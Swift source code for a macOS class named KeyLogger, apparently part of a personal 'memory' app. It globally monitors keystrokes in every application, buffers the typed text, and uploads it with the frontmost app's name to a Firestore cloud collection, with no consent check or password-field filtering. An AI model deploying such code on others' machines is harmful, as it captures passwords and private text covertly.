import Cocoa
import FirebaseFirestore
import FirebaseCore

class KeyLogger: ObservableObject {
    private var globalMonitor: Any?
    private var currentBuffer = ""
    private var lastActivityTime = Date()
    private var typingTimer: Timer?
    private var isTypingActive = false
    private var typingDebounceTimer: Timer?
    private var lastTypingStartTime: Date = Date.distantPast
    private var lastTypingStopTime: Date = Date.distantPast
    private var isProcessingTypingState = false
    
    // Callbacks
    var onBufferUpdate: ((String) -> Void)?
    var onTextSaved: ((String) -> Void)?
    var onError: ((String) -> Void)?
    var onTypingStarted: (() -> Void)?
    var onTypingStopped: (() -> Void)?
    
    private lazy var db: Firestore? = {
        guard FirebaseApp.app() != nil else { return nil }
        return Firestore.firestore()
    }()
    
    init() {
        print("🔍 KeyLogger initialized")
        setupNotificationObservers()
    }
    
    private func setupNotificationObservers() {
        // No observer for AddMemoryToInput here. Only AppDelegate should handle it.
    }
    
    func startLogging() {
        // Ensure Firebase is configured
        guard FirebaseApp.app() != nil else {
            print("❌ Firebase not configured")
            DispatchQueue.main.async {
                self.onError?("Firebase not configured. Please restart the app.")
            }
            return
        }
        
        // Remove any existing observer first
        NotificationCenter.default.removeObserver(self, name: NSNotification.Name("AddMemoryToInput"), object: nil)
        
        globalMonitor = NSEvent.addGlobalMonitorForEvents(matching: .keyDown) { [weak self] event in
            guard let self = self, let characters = event.characters else { return }
            
            // Update activity time
            self.lastActivityTime = Date()
            
            // Handle typing state with proper debouncing
            self.handleTypingState()
            
            // Handle special keys
            for character in characters {
                if character == "\r" || character == "\n" { // Enter key
                    if !self.currentBuffer.isEmpty {
                        self.saveBuffer()
                    }
                } else if character == "\u{8}" { // Backspace
                    if !self.currentBuffer.isEmpty {
                        self.currentBuffer.removeLast()
                    }
                } else if character == "\u{1B}" { // Escape key
                    // Don't capture escape
                    continue
                } else if character == "\u{9}" { // Tab key
                    // Don't capture tab
                    continue
                } else if character == "\u{7F}" { // Delete key
                    if !self.currentBuffer.isEmpty {
                        self.currentBuffer.removeLast()
                    }
                } else {
                    // Only add printable characters and spaces
                    if character.isLetter || character.isNumber || character.isPunctuation || character.isSymbol || character == " " {
                        self.currentBuffer.append(character)
                    }
                }
            }
            
            // Update UI
            DispatchQueue.main.async {
                self.onBufferUpdate?(self.currentBuffer)
            }
            
            // Auto-save when buffer gets long enough
            if self.currentBuffer.count >= 50 {
                self.saveBuffer()
            }
        }
    }
    
    private func handleTypingState() {
        // Prevent concurrent processing
        if isProcessingTypingState {
            return
        }
        
        let now = Date()
        
        // If not currently typing, start typing with debouncing
        if !isTypingActive {
            // Debounce typing start to prevent rapid show/hide cycles
            if now.timeIntervalSince(lastTypingStartTime) < 0.5 {
                return
            }
            
            isProcessingTypingState = true
            isTypingActive = true
            lastTypingStartTime = now
            print("🔍 [KeyLogger] Typing started")
            
            DispatchQueue.main.async {
                self.onTypingStarted?()
                self.isProcessingTypingState = false
            }
        }
        
        // Reset the typing timer with a longer delay
        typingTimer?.invalidate()
        typingTimer = Timer.scheduledTimer(withTimeInterval: 3.0, repeats: false) { [weak self] _ in
            self?.stopTyping()
        }
    }
    
    private func stopTyping() {
        guard isTypingActive else { return }
        
        let now = Date()
        
        // Debounce typing stop to prevent rapid show/hide cycles
        if now.timeIntervalSince(lastTypingStopTime) < 0.5 {
            return
        }
        
        isTypingActive = false
        lastTypingStopTime = now
        print("🔍 [KeyLogger] Typing stopped")
        
        DispatchQueue.main.async {
            self.onTypingStopped?()
        }
    }
    
    func stopLogging() {
        if let monitor = globalMonitor {
            NSEvent.removeMonitor(monitor)
            globalMonitor = nil
        }
        
        // Stop typing if active
        if isTypingActive {
            stopTyping()
        }
        
        // Invalidate timers
        typingTimer?.invalidate()
        typingTimer = nil
        typingDebounceTimer?.invalidate()
        typingDebounceTimer = nil
        
        // Remove notification observer
        NotificationCenter.default.removeObserver(self, name: NSNotification.Name("AddMemoryToInput"), object: nil)
    }

    func clearBuffer() {
        currentBuffer = ""
        DispatchQueue.main.async {
            self.onBufferUpdate?("")
        }
        print("🔍 Buffer cleared")
    }
    
    private func saveBuffer() {
        guard !currentBuffer.isEmpty else { return }
        
        guard let db = db else {
            print("❌ Firestore not initialized")
            DispatchQueue.main.async {
                self.onError?("Firestore not initialized")
            }
            return
        }
        
        let textToSave = currentBuffer.trimmingCharacters(in: .whitespacesAndNewlines)
        guard !textToSave.isEmpty else { return }
        
        // Get current app and window info
        let appName = NSWorkspace.shared.frontmostApplication?.localizedName ?? "Unknown"
        let windowTitle = getCurrentWindowTitle()
        
        let memoryData: [String: Any] = [
            "text": textToSave,
            "timestamp": Timestamp(date: Date()),
            "appName": appName,
            "windowTitle": windowTitle
        ]
        
        print("🔍 Saving to Firestore: \(textToSave)")
        
        db.collection("memory").addDocument(data: memoryData) { [weak self] error in
            DispatchQueue.main.async {
                if let error = error {
                    print("❌ Error saving to Firestore: \(error.localizedDescription)")
                    self?.onError?("Failed to save: \(error.localizedDescription)")
                } else {
                    print("✅ Successfully saved to Firestore")
                    self?.onTextSaved?(textToSave)
                    self?.currentBuffer = ""
                    self?.onBufferUpdate?("")
                }
            }
        }
    }
    
    private func getCurrentAppName() -> String {
        let workspace = NSWorkspace.shared
        if let frontmostApp = workspace.frontmostApplication {
            return frontmostApp.localizedName ?? "Unknown"
        }
        return "Unknown"
    }
    
    private func getCurrentWindowTitle() -> String {
        // This is a simplified version - in a real app you might want more sophisticated window detection
        return "Active Window"
    }

    deinit {
        stopLogging()
    }
}

